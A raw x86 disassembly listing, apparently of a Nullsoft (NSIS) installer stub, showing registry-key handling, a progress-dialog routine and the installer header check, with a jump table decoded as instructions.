  402be0:	8b f0                	mov    %eax,%esi
  402be2:	e8 eb 01 00 00       	call   0x402dd2
  402be7:	3b f3                	cmp    %ebx,%esi
  402be9:	74 37                	je     0x402c22
  402beb:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bee:	51                   	push   %ecx
  402bef:	50                   	push   %eax
  402bf0:	ff 15 9c 82 40 00    	call   *0x40829c
  402bf6:	85 c0                	test   %eax,%eax
  402bf8:	7c 28                	jl     0x402c22
  402bfa:	8d 45 08             	lea    0x8(%ebp),%eax
  402bfd:	50                   	push   %eax
  402bfe:	53                   	push   %ebx
  402bff:	ff 75 dc             	push   -0x24(%ebp)
  402c02:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402c05:	50                   	push   %eax
  402c06:	ff d6                	call   *%esi
  402c08:	85 c0                	test   %eax,%eax
  402c0a:	7c 16                	jl     0x402c22
  402c0c:	ff 75 08             	push   0x8(%ebp)
  402c0f:	ff 75 f4             	push   -0xc(%ebp)
  402c12:	e8 9b 39 00 00       	call   0x4065b2
  402c17:	ff 75 08             	push   0x8(%ebp)
  402c1a:	ff 15 a0 82 40 00    	call   *0x4082a0
  402c20:	eb 34                	jmp    0x402c56
  402c22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402c25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c2c:	66 89 18             	mov    %bx,(%eax)
  402c2f:	eb 25                	jmp    0x402c56
  402c31:	8b 0d 68 ea 42 00    	mov    0x42ea68,%ecx
  402c37:	53                   	push   %ebx
  402c38:	23 c8                	and    %eax,%ecx
  402c3a:	51                   	push   %ecx
  402c3b:	6a 0b                	push   $0xb
  402c3d:	ff 75 f8             	push   -0x8(%ebp)
  402c40:	ff 15 58 82 40 00    	call   *0x408258
  402c46:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c49:	74 0b                	je     0x402c56
  402c4b:	53                   	push   %ebx
  402c4c:	53                   	push   %ebx
  402c4d:	ff 75 f8             	push   -0x8(%ebp)
  402c50:	ff 15 54 82 40 00    	call   *0x408254
  402c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c59:	01 05 88 47 43 00    	add    %eax,0x434788
  402c5f:	33 c0                	xor    %eax,%eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5b                   	pop    %ebx
  402c64:	c9                   	leave
  402c65:	c2 04 00             	ret    $0x4
  402c68:	61                   	popa
  402c69:	2c 40                	sub    $0x40,%al
  402c6b:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c71:	14 40                	adc    $0x40,%al
  402c73:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c79:	14 40                	adc    $0x40,%al
  402c7b:	00 d7                	add    %dl,%bh
  402c7d:	14 40                	adc    $0x40,%al
  402c7f:	00 f5                	add    %dh,%ch
  402c81:	14 40                	adc    $0x40,%al
  402c83:	00 98 15 40 00 c8    	add    %bl,-0x37ffbfeb(%eax)
  402c89:	15 40 00 e6 15       	adc    $0x15e60040,%eax
  402c8e:	40                   	inc    %eax
  402c8f:	00 96 16 40 00 03    	add    %dl,0x3004016(%esi)
  402c95:	15 40 00 67 15       	adc    $0x15670040,%eax
  402c9a:	40                   	inc    %eax
  402c9b:	00 88 15 40 00 a7    	add    %cl,-0x58ffbfeb(%eax)
  402ca1:	16                   	push   %ss
  402ca2:	40                   	inc    %eax
  402ca3:	00 f8                	add    %bh,%al
  402ca5:	16                   	push   %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 61 17             	add    %ah,0x17(%ecx)
  402caa:	40                   	inc    %eax
  402cab:	00 88 17 40 00 9b    	add    %cl,-0x64ffbfe9(%eax)
  402cb1:	17                   	pop    %ss
  402cb2:	40                   	inc    %eax
  402cb3:	00 38                	add    %bh,(%eax)
  402cb5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cb8:	3b 19                	cmp    (%ecx),%ebx
  402cba:	40                   	inc    %eax
  402cbb:	00 6d 19             	add    %ch,0x19(%ebp)
  402cbe:	40                   	inc    %eax
  402cbf:	00 82 19 40 00 94    	add    %al,-0x6bffbfe7(%edx)
  402cc5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cc8:	2b 1a                	sub    (%edx),%ebx
  402cca:	40                   	inc    %eax
  402ccb:	00 5c 1a 40          	add    %bl,0x40(%edx,%ebx,1)
  402ccf:	00 9e 1a 40 00 de    	add    %bl,-0x21ffbfe6(%esi)
  402cd5:	1a 40 00             	sbb    0x0(%eax),%al
  402cd8:	a3 1b 40 00 c7       	mov    %eax,0xc700401b
  402cdd:	1b 40 00             	sbb    0x0(%eax),%eax
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 6f 1c             	add    %ch,0x1c(%edi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 43 1d             	add    %al,0x1d(%ebx)
  402cea:	40                   	inc    %eax
  402ceb:	00 64 1d 40          	add    %ah,0x40(%ebp,%ebx,1)
  402cef:	00 89 1d 40 00 ad    	add    %cl,-0x52ffbfe3(%ecx)
  402cf5:	1d 40 00 7a 1e       	sbb    $0x1e7a0040,%eax
  402cfa:	40                   	inc    %eax
  402cfb:	00 0a                	add    %cl,(%edx)
  402cfd:	1f                   	pop    %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 3e                	add    %bh,(%esi)
  402d01:	1f                   	pop    %ds
  402d02:	40                   	inc    %eax
  402d03:	00 d0                	add    %dl,%al
  402d05:	1f                   	pop    %ds
  402d06:	40                   	inc    %eax
  402d07:	00 22                	add    %ah,(%edx)
  402d09:	20 40 00             	and    %al,0x0(%eax)
  402d0c:	56                   	push   %esi
  402d0d:	20 40 00             	and    %al,0x0(%eax)
  402d10:	03 21                	add    (%ecx),%esp
  402d12:	40                   	inc    %eax
  402d13:	00 d6                	add    %dl,%dh
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	2b 23                	sub    (%ebx),%esp
  402d1a:	40                   	inc    %eax
  402d1b:	00 af 23 40 00 de    	add    %ch,-0x21ffbfdd(%edi)
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	20 24 40             	and    %ah,(%eax,%eax,2)
  402d27:	00 60 24             	add    %ah,0x24(%eax)
  402d2a:	40                   	inc    %eax
  402d2b:	00 b6 24 40 00 56    	add    %dh,0x56004024(%esi)
  402d31:	25 40 00 ca 25       	and    $0x25ca0040,%eax
  402d36:	40                   	inc    %eax
  402d37:	00 34 26             	add    %dh,(%esi,%eiz,1)
  402d3a:	40                   	inc    %eax
  402d3b:	00 48 26             	add    %cl,0x26(%eax)
  402d3e:	40                   	inc    %eax
  402d3f:	00 6a 26             	add    %ch,0x26(%edx)
  402d42:	40                   	inc    %eax
  402d43:	00 18                	add    %bl,(%eax)
  402d45:	27                   	daa
  402d46:	40                   	inc    %eax
  402d47:	00 bb 28 40 00 f0    	add    %bh,-0xfffbfd8(%ebx)
  402d4d:	28 40 00             	sub    %al,0x0(%eax)
  402d50:	0a 29                	or     (%ecx),%ch
  402d52:	40                   	inc    %eax
  402d53:	00 37                	add    %dh,(%edi)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	7c 29                	jl     0x402d83
  402d5a:	40                   	inc    %eax
  402d5b:	00 87 2a 40 00 17    	add    %al,0x1700402a(%edi)
  402d61:	2b 40 00             	sub    0x0(%eax),%eax
  402d64:	85 2b                	test   %ebp,(%ebx)
  402d66:	40                   	inc    %eax
  402d67:	00 56 2c             	add    %dl,0x2c(%esi)
  402d6a:	40                   	inc    %eax
  402d6b:	00 31                	add    %dh,(%ecx)
  402d6d:	2c 40                	sub    $0x40,%al
  402d6f:	00 6a 26             	add    %ch,0x26(%edx)
  402d72:	40                   	inc    %eax
  402d73:	00 18                	add    %bl,(%eax)
  402d75:	27                   	daa
  402d76:	40                   	inc    %eax
  402d77:	00 0e                	add    %cl,(%esi)
  402d79:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7c:	15 1b 40 00 1c       	adc    $0x1c00401b,%eax
  402d81:	1b 40 00             	sbb    0x0(%eax),%eax
  402d84:	21 1b                	and    %ebx,(%ebx)
  402d86:	40                   	inc    %eax
  402d87:	00 31                	add    %dh,(%ecx)
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	35 1b 40 00 39       	xor    $0x3900401b,%eax
  402d91:	1b 40 00             	sbb    0x0(%eax),%eax
  402d94:	42                   	inc    %edx
  402d95:	1b 40 00             	sbb    0x0(%eax),%eax
  402d98:	4b                   	dec    %ebx
  402d99:	1b 40 00             	sbb    0x0(%eax),%eax
  402d9c:	58                   	pop    %eax
  402d9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402da0:	68 1b 40 00 86       	push   $0x8600401b
  402da5:	1b 40 00             	sbb    0x0(%eax),%eax
  402da8:	8d 1b                	lea    (%ebx),%ebx
  402daa:	40                   	inc    %eax
  402dab:	00 94 1b 40 00 8b 44 	add    %dl,0x448b0040(%ebx,%ebx,1)
  402db2:	24 04                	and    $0x4,%al
  402db4:	8b 0d 4c ce 40 00    	mov    0x40ce4c,%ecx
  402dba:	56                   	push   %esi
  402dbb:	ff 34 81             	push   (%ecx,%eax,4)
  402dbe:	6a 00                	push   $0x0
  402dc0:	e8 2a 38 00 00       	call   0x4065ef
  402dc5:	8b f0                	mov    %eax,%esi
  402dc7:	56                   	push   %esi
  402dc8:	e8 45 37 00 00       	call   0x406512
  402dcd:	0f b7 16             	movzwl (%esi),%edx
  402dd0:	5e                   	pop    %esi
  402dd1:	c3                   	ret
  402dd2:	56                   	push   %esi
  402dd3:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd7:	85 f6                	test   %esi,%esi
  402dd9:	57                   	push   %edi
  402dda:	8b c6                	mov    %esi,%eax
  402ddc:	7d 02                	jge    0x402de0
  402dde:	f7 d8                	neg    %eax
  402de0:	8b 15 4c ce 40 00    	mov    0x40ce4c,%edx
  402de6:	8b c8                	mov    %eax,%ecx
  402de8:	83 e1 0f             	and    $0xf,%ecx
  402deb:	c1 f8 04             	sar    $0x4,%eax
  402dee:	ff 34 8a             	push   (%edx,%ecx,4)
  402df1:	c1 e0 0b             	shl    $0xb,%eax
  402df4:	05 f0 a5 40 00       	add    $0x40a5f0,%eax
  402df9:	50                   	push   %eax
  402dfa:	e8 f0 37 00 00       	call   0x4065ef
  402dff:	85 f6                	test   %esi,%esi
  402e01:	8b f8                	mov    %eax,%edi
  402e03:	7d 06                	jge    0x402e0b
  402e05:	57                   	push   %edi
  402e06:	e8 55 3a 00 00       	call   0x406860
  402e0b:	8b c7                	mov    %edi,%eax
  402e0d:	5f                   	pop    %edi
  402e0e:	5e                   	pop    %esi
  402e0f:	c2 04 00             	ret    $0x4
  402e12:	55                   	push   %ebp
  402e13:	8b ec                	mov    %esp,%ebp
  402e15:	8d 45 08             	lea    0x8(%ebp),%eax
  402e18:	50                   	push   %eax
  402e19:	8b 45 08             	mov    0x8(%ebp),%eax
  402e1c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e21:	50                   	push   %eax
  402e22:	6a 22                	push   $0x22
  402e24:	e8 a9 ff ff ff       	call   0x402dd2
  402e29:	50                   	push   %eax
  402e2a:	a1 4c ce 40 00       	mov    0x40ce4c,%eax
  402e2f:	ff 70 04             	push   0x4(%eax)
  402e32:	e8 13 00 00 00       	call   0x402e4a
  402e37:	50                   	push   %eax
  402e38:	e8 e2 35 00 00       	call   0x40641f
  402e3d:	f7 d8                	neg    %eax
  402e3f:	1b c0                	sbb    %eax,%eax
  402e41:	f7 d0                	not    %eax
  402e43:	23 45 08             	and    0x8(%ebp),%eax
  402e46:	5d                   	pop    %ebp
  402e47:	c2 04 00             	ret    $0x4
  402e4a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	7c 0d                	jl     0x402e5f
  402e52:	8b 0d 84 47 43 00    	mov    0x434784,%ecx
  402e58:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e5f:	c2 04 00             	ret    $0x4
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	8d 45 10             	lea    0x10(%ebp),%eax
  402e68:	50                   	push   %eax
  402e69:	8b 45 10             	mov    0x10(%ebp),%eax
  402e6c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e71:	50                   	push   %eax
  402e72:	ff 75 0c             	push   0xc(%ebp)
  402e75:	ff 75 08             	push   0x8(%ebp)
  402e78:	e8 cd ff ff ff       	call   0x402e4a
  402e7d:	50                   	push   %eax
  402e7e:	e8 ca 35 00 00       	call   0x40644d
  402e83:	f7 d8                	neg    %eax
  402e85:	1b c0                	sbb    %eax,%eax
  402e87:	f7 d0                	not    %eax
  402e89:	23 45 10             	and    0x10(%ebp),%eax
  402e8c:	5d                   	pop    %ebp
  402e8d:	c2 0c 00             	ret    $0xc
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	56                   	push   %esi
  402e94:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e97:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e9b:	75 07                	jne    0x402ea4
  402e9d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402ea2:	eb 2c                	jmp    0x402ed0
  402ea4:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402eab:	8d 45 10             	lea    0x10(%ebp),%eax
  402eae:	50                   	push   %eax
  402eaf:	ff 75 08             	push   0x8(%ebp)
  402eb2:	e8 93 ff ff ff       	call   0x402e4a
  402eb7:	50                   	push   %eax
  402eb8:	e8 e1 34 00 00       	call   0x40639e
  402ebd:	85 c0                	test   %eax,%eax
  402ebf:	74 0c                	je     0x402ecd
  402ec1:	ff 75 10             	push   0x10(%ebp)
  402ec4:	56                   	push   %esi
  402ec5:	50                   	push   %eax
  402ec6:	e8 0a 00 00 00       	call   0x402ed5
  402ecb:	eb 03                	jmp    0x402ed0
  402ecd:	6a 06                	push   $0x6
  402ecf:	58                   	pop    %eax
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	c2 0c 00             	ret    $0xc
  402ed5:	55                   	push   %ebp
  402ed6:	8b ec                	mov    %esp,%ebp
  402ed8:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402ede:	53                   	push   %ebx
  402edf:	56                   	push   %esi
  402ee0:	8b 75 10             	mov    0x10(%ebp),%esi
  402ee3:	57                   	push   %edi
  402ee4:	8b fe                	mov    %esi,%edi
  402ee6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ee9:	81 e6 00 03 00 00    	and    $0x300,%esi
  402eef:	50                   	push   %eax
  402ef0:	8b c6                	mov    %esi,%eax
  402ef2:	83 e7 01             	and    $0x1,%edi
  402ef5:	0c 09                	or     $0x9,%al
  402ef7:	50                   	push   %eax
  402ef8:	ff 75 0c             	push   0xc(%ebp)
  402efb:	ff 75 08             	push   0x8(%ebp)
  402efe:	e8 1c 35 00 00       	call   0x40641f
  402f03:	33 db                	xor    %ebx,%ebx
  402f05:	3b c3                	cmp    %ebx,%eax
  402f07:	0f 85 ab 00 00 00    	jne    0x402fb8
  402f0d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402f11:	74 23                	je     0x402f36
  402f13:	53                   	push   %ebx
  402f14:	53                   	push   %ebx
  402f15:	53                   	push   %ebx
  402f16:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f19:	53                   	push   %ebx
  402f1a:	50                   	push   %eax
  402f1b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f21:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f24:	50                   	push   %eax
  402f25:	53                   	push   %ebx
  402f26:	ff 75 fc             	push   -0x4(%ebp)
  402f29:	ff 15 00 80 40 00    	call   *0x408000
  402f2f:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f34:	75 67                	jne    0x402f9d
  402f36:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f3c:	68 05 01 00 00       	push   $0x105
  402f41:	50                   	push   %eax
  402f42:	53                   	push   %ebx
  402f43:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f49:	eb 27                	jmp    0x402f72
  402f4b:	85 ff                	test   %edi,%edi
  402f4d:	75 4e                	jne    0x402f9d
  402f4f:	ff 75 10             	push   0x10(%ebp)
  402f52:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f58:	50                   	push   %eax
  402f59:	ff 75 fc             	push   -0x4(%ebp)
  402f5c:	e8 74 ff ff ff       	call   0x402ed5
  402f61:	85 c0                	test   %eax,%eax
  402f63:	75 16                	jne    0x402f7b
  402f65:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f6b:	68 05 01 00 00       	push   $0x105
  402f70:	50                   	push   %eax
  402f71:	57                   	push   %edi
  402f72:	ff 75 fc             	push   -0x4(%ebp)
  402f75:	ff d3                	call   *%ebx
  402f77:	85 c0                	test   %eax,%eax
  402f79:	74 d0                	je     0x402f4b
  402f7b:	ff 75 fc             	push   -0x4(%ebp)
  402f7e:	ff 15 10 80 40 00    	call   *0x408010
  402f84:	6a 03                	push   $0x3
  402f86:	e8 1b 3a 00 00       	call   0x4069a6
  402f8b:	85 c0                	test   %eax,%eax
  402f8d:	75 1e                	jne    0x402fad
  402f8f:	ff 75 0c             	push   0xc(%ebp)
  402f92:	ff 75 08             	push   0x8(%ebp)
  402f95:	ff 15 18 80 40 00    	call   *0x408018
  402f9b:	eb 1b                	jmp    0x402fb8
  402f9d:	ff 75 fc             	push   -0x4(%ebp)
  402fa0:	ff 15 10 80 40 00    	call   *0x408010
  402fa6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402fab:	eb 0b                	jmp    0x402fb8
  402fad:	6a 00                	push   $0x0
  402faf:	56                   	push   %esi
  402fb0:	ff 75 0c             	push   0xc(%ebp)
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff d0                	call   *%eax
  402fb8:	5f                   	pop    %edi
  402fb9:	5e                   	pop    %esi
  402fba:	5b                   	pop    %ebx
  402fbb:	c9                   	leave
  402fbc:	c2 0c 00             	ret    $0xc
  402fbf:	55                   	push   %ebp
  402fc0:	8b ec                	mov    %esp,%ebp
  402fc2:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fc8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fcf:	75 19                	jne    0x402fea
  402fd1:	6a 00                	push   $0x0
  402fd3:	68 fa 00 00 00       	push   $0xfa
  402fd8:	6a 01                	push   $0x1
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	ff 15 18 82 40 00    	call   *0x408218
  402fe3:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fea:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ff1:	75 4c                	jne    0x40303f
  402ff3:	8b 0d 18 6a 41 00    	mov    0x416a18,%ecx
  402ff9:	a1 24 aa 42 00       	mov    0x42aa24,%eax
  402ffe:	3b c8                	cmp    %eax,%ecx
  403000:	72 02                	jb     0x403004
  403002:	8b c8                	mov    %eax,%ecx
  403004:	50                   	push   %eax
  403005:	6a 64                	push   $0x64
  403007:	51                   	push   %ecx
  403008:	ff 15 48 81 40 00    	call   *0x408148
  40300e:	50                   	push   %eax
  40300f:	8d 45 80             	lea    -0x80(%ebp),%eax
  403012:	68 1c a0 40 00       	push   $0x40a01c
  403017:	50                   	push   %eax
  403018:	ff 15 2c 82 40 00    	call   *0x40822c
  40301e:	83 c4 0c             	add    $0xc,%esp
  403021:	8d 45 80             	lea    -0x80(%ebp),%eax
  403024:	50                   	push   %eax
  403025:	ff 75 08             	push   0x8(%ebp)
  403028:	ff 15 1c 82 40 00    	call   *0x40821c
  40302e:	8d 45 80             	lea    -0x80(%ebp),%eax
  403031:	50                   	push   %eax
  403032:	68 06 04 00 00       	push   $0x406
  403037:	ff 75 08             	push   0x8(%ebp)
  40303a:	e8 b1 2b 00 00       	call   0x405bf0
  40303f:	33 c0                	xor    %eax,%eax
  403041:	c9                   	leave
  403042:	c2 10 00             	ret    $0x10
  403045:	56                   	push   %esi
  403046:	33 f6                	xor    %esi,%esi
  403048:	39 74 24 08          	cmp    %esi,0x8(%esp)
  40304c:	74 18                	je     0x403066
  40304e:	a1 20 aa 42 00       	mov    0x42aa20,%eax
  403053:	3b c6                	cmp    %esi,%eax
  403055:	74 07                	je     0x40305e
  403057:	50                   	push   %eax
  403058:	ff 15 10 82 40 00    	call   *0x408210
  40305e:	89 35 20 aa 42 00    	mov    %esi,0x42aa20
  403064:	5e                   	pop    %esi
  403065:	c3                   	ret
  403066:	39 35 20 aa 42 00    	cmp    %esi,0x42aa20
  40306c:	74 08                	je     0x403076
  40306e:	56                   	push   %esi
  40306f:	e8 6e 39 00 00       	call   0x4069e2
  403074:	5e                   	pop    %esi
  403075:	c3                   	ret
  403076:	ff 15 d0 80 40 00    	call   *0x4080d0
  40307c:	3b 05 0c 47 43 00    	cmp    0x43470c,%eax
  403082:	76 23                	jbe    0x4030a7
  403084:	56                   	push   %esi
  403085:	68 bf 2f 40 00       	push   $0x402fbf
  40308a:	56                   	push   %esi
  40308b:	6a 6f                	push   $0x6f
  40308d:	ff 35 00 47 43 00    	push   0x434700
  403093:	ff 15 14 82 40 00    	call   *0x408214
  403099:	6a 05                	push   $0x5
  40309b:	50                   	push   %eax
  40309c:	a3 20 aa 42 00       	mov    %eax,0x42aa20
  4030a1:	ff 15 28 82 40 00    	call   *0x408228
  4030a7:	5e                   	pop    %esi
  4030a8:	c3                   	ret
  4030a9:	55                   	push   %ebp
  4030aa:	8b ec                	mov    %esp,%ebp
  4030ac:	83 ec 28             	sub    $0x28,%esp
  4030af:	53                   	push   %ebx
  4030b0:	56                   	push   %esi
  4030b1:	57                   	push   %edi
  4030b2:	33 ff                	xor    %edi,%edi
  4030b4:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4030b7:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4030ba:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4030bd:	ff 15 d0 80 40 00    	call   *0x4080d0
  4030c3:	be 00 28 44 00       	mov    $0x442800,%esi
  4030c8:	68 00 04 00 00       	push   $0x400
  4030cd:	05 e8 03 00 00       	add    $0x3e8,%eax
  4030d2:	56                   	push   %esi
  4030d3:	57                   	push   %edi
  4030d4:	a3 0c 47 43 00       	mov    %eax,0x43470c
  4030d9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4030df:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4030e4:	eb 27                	jmp    0x40310d
  4030e6:	ff 15 c8 80 40 00    	call   *0x4080c8
  4030ec:	83 f8 20             	cmp    $0x20,%eax
  4030ef:	0f 85 1c 01 00 00    	jne    0x403211
  4030f5:	ff 45 fc             	incl   -0x4(%ebp)
  4030f8:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
  4030fc:	0f 87 0f 01 00 00    	ja     0x403211
  403102:	68 fa 00 00 00       	push   $0xfa
  403107:	ff 15 d4 80 40 00    	call   *0x4080d4
  40310d:	6a 03                	push   $0x3
  40310f:	57                   	push   %edi
  403110:	56                   	push   %esi
  403111:	e8 8c 2f 00 00       	call   0x4060a2
  403116:	8b d8                	mov    %eax,%ebx
  403118:	83 fb ff             	cmp    $0xffffffff,%ebx
  40311b:	89 1d 18 a0 40 00    	mov    %ebx,0x40a018
  403121:	74 c3                	je     0x4030e6
  403123:	56                   	push   %esi
  403124:	be 00 08 44 00       	mov    $0x440800,%esi
  403129:	56                   	push   %esi
  40312a:	e8 83 34 00 00       	call   0x4065b2
  40312f:	56                   	push   %esi
  403130:	e8 98 2d 00 00       	call   0x405ecd
  403135:	50                   	push   %eax
  403136:	68 00 30 44 00       	push   $0x443000
  40313b:	e8 72 34 00 00       	call   0x4065b2
  403140:	6a 00                	push   $0x0
  403142:	53                   	push   %ebx
  403143:	ff 15 cc 80 40 00    	call   *0x4080cc
  403149:	85 c0                	test   %eax,%eax
  40314b:	a3 24 aa 42 00       	mov    %eax,0x42aa24
  403150:	8b f0                	mov    %eax,%esi
  403152:	0f 86 f8 00 00 00    	jbe    0x403250
  403158:	a1 14 47 43 00       	mov    0x434714,%eax
  40315d:	8b fe                	mov    %esi,%edi
  40315f:	f7 d8                	neg    %eax
  403161:	1b c0                	sbb    %eax,%eax
  403163:	25 00 7e 00 00       	and    $0x7e00,%eax
  403168:	05 00 02 00 00       	add    $0x200,%eax
  40316d:	3b f0                	cmp    %eax,%esi
  40316f:	72 02                	jb     0x403173
  403171:	8b f8                	mov    %eax,%edi
  403173:	57                   	push   %edi
  403174:	68 20 6a 41 00       	push   $0x416a20
  403179:	e8 b1 03 00 00       	call   0x40352f
  40317e:	85 c0                	test   %eax,%eax
  403180:	0f 84 36 01 00 00    	je     0x4032bc
  403186:	83 3d 14 47 43 00 00 	cmpl   $0x0,0x434714
  40318d:	0f 85 88 00 00 00    	jne    0x40321b
  403193:	6a 1c                	push   $0x1c
  403195:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403198:	68 20 6a 41 00       	push   $0x416a20
  40319d:	50                   	push   %eax
  40319e:	e8 ba 2e 00 00       	call   0x40605d
  4031a3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031a6:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031ab:	75 7c                	jne    0x403229
  4031ad:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  4031b4:	75 73                	jne    0x403229
  4031b6:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  4031bd:	75 6a                	jne    0x403229
  4031bf:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4031c6:	75 61                	jne    0x403229
  4031c8:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4031cf:	75 58                	jne    0x403229
  4031d1:	09 45 08             	or     %eax,0x8(%ebp)
  4031d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4031d7:	8b 0d 18 6a 41 00    	mov    0x416a18,%ecx
  4031dd:	83 e0 02             	and    $0x2,%eax
  4031e0:	09 05 a0 47 43 00    	or     %eax,0x4347a0
  4031e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4031e9:	3b c6                	cmp    %esi,%eax
  4031eb:	89 0d 14 47 43 00    	mov    %ecx,0x434714
  4031f1:	0f 87 be 00 00 00    	ja     0x4032b5
  4031f7:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4031fb:	75 06                	jne    0x403203
  4031fd:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403201:	75 4d                	jne    0x403250
  403203:	ff 45 f8             	incl   -0x8(%ebp)
  403206:	8d 70 fc             	lea    -0x4(%eax),%esi
  403209:	3b fe                	cmp    %esi,%edi
  40320b:	76 1c                	jbe    0x403229
  40320d:	8b fe                	mov    %esi,%edi
  40320f:	eb 18                	jmp    0x403229
  403211:	b8 e8 a1 40 00       	mov    $0x40a1e8,%eax
  403216:	e9 f2 00 00 00       	jmp    0x40330d
  40321b:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  40321f:	75 08                	jne    0x403229
  403221:	6a 00                	push   $0x0
  403223:	e8 1d fe ff ff       	call   0x403045
  403228:	59                   	pop    %ecx
  403229:	3b 35 24 aa 42 00    	cmp    0x42aa24,%esi
  40322f:	73 11                	jae    0x403242
  403231:	57                   	push   %edi
  403232:	68 20 6a 41 00       	push   $0x416a20
  403237:	ff 75 f4             	push   -0xc(%ebp)
  40323a:	e8 54 38 00 00       	call   0x406a93
  40323f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403242:	01 3d 18 6a 41 00    	add    %edi,0x416a18
  403248:	2b f7                	sub    %edi,%esi
  40324a:	0f 85 08 ff ff ff    	jne    0x403158
  403250:	6a 01                	push   $0x1
  403252:	e8 ee fd ff ff       	call   0x403045
  403257:	33 ff                	xor    %edi,%edi
  403259:	59                   	pop    %ecx
  40325a:	39 3d 14 47 43 00    	cmp    %edi,0x434714
  403260:	74 53                	je     0x4032b5
  403262:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  403265:	74 22                	je     0x403289
  403267:	ff 35 18 6a 41 00    	push   0x416a18
  40326d:	e8 d3 02 00 00       	call   0x403545
  403272:	8d 45 08             	lea    0x8(%ebp),%eax
  403275:	6a 04                	push   $0x4
  403277:	50                   	push   %eax
  403278:	e8 b2 02 00 00       	call   0x40352f
  40327d:	85 c0                	test   %eax,%eax
  40327f:	74 34                	je     0x4032b5
  403281:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403284:	3b 45 08             	cmp    0x8(%ebp),%eax
  403287:	75 2c                	jne    0x4032b5
  403289:	ff 75 ec             	push   -0x14(%ebp)
  40328c:	6a 40                	push   $0x40
  40328e:	ff 15 10 81 40 00    	call   *0x408110
  403294:	8b f0                	mov    %eax,%esi
  403296:	a1 14 47 43 00       	mov    0x434714,%eax
  40329b:	83 c0 1c             	add    $0x1c,%eax
  40329e:	50                   	push   %eax
  40329f:	e8 a1 02 00 00       	call   0x403545
  4032a4:	ff 75 ec             	push   -0x14(%ebp)
  4032a7:	56                   	push   %esi
  4032a8:	57                   	push   %edi
  4032a9:	6a ff                	push   $0xffffffff
  4032ab:	e8 64 00 00 00       	call   0x403314
  4032b0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4032b3:	74 11                	je     0x4032c6
